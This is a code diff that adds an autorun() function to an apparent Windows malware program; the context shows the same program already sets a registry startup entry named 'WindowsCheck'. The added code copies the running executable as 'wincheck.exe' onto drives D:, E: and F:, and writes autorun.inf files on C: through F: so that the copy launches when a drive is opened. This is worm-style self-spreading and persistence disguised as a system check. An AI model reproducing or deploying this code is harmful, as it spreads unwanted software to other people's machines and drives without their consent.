@@ -334,3 +334,33 @@ void start_no_UAC () {
    	RegOpenKey(HKEY_CURRENT_USER, startup, &hkeySTART);
    	RegSetValueEx(hkeySTART, "WindowsCheck", 0, REG_SZ, (LPBYTE)pathstartup, sizeof(pathstartup));
 }
+void autorun(){
+	ofstream autorunc("C:\\autorun.inf");
+	autorunc << "[AutoRun.Amd64]" << endl;
+	autorunc << "open=wincheck.exe" << endl;
+	autorunc << "[AutoRun]" << endl;
+	autorunc << "open=wincheck.exe" << endl;
+	CHAR autorunpath[5000];
+    GetModuleFileName(NULL, autorunpath, sizeof(autorunpath));
+   	CHAR pathcopytod[] = "D:\\wincheck.exe";
+   	CopyFile(autorunpath, pathcopytod, false);
+	ofstream autorund("D:\\autorun.inf");
+	autorund << "[AutoRun.Amd64]" << endl;
+	autorund << "open=wincheck.exe" << endl;
+	autorund << "[AutoRun]" << endl;
+	autorund << "open=wincheck.exe" << endl;
+	CHAR pathcopytoe[] = "E:\\wincheck.exe";
+   	CopyFile(autorunpath, pathcopytoe, false);
+	ofstream autorune("E:\\autorun.inf");
+	autorune << "[AutoRun.Amd64]" << endl;
+	autorune << "open=wincheck.exe" << endl;
+	autorune << "[AutoRun]" << endl;
+	autorune << "open=wincheck.exe" << endl;
+	CHAR pathcopytof[] = "F:\\wincheck.exe";
+   	CopyFile(autorunpath, pathcopytof, false);
+	ofstream autorunf("F:\\autorun.inf");
+	autorunf << "[AutoRun.Amd64]" << endl;
+	autorunf << "open=wincheck.exe" << endl;
+	autorunf << "[AutoRun]" << endl;
+	autorunf << "open=wincheck.exe" << endl;
+}
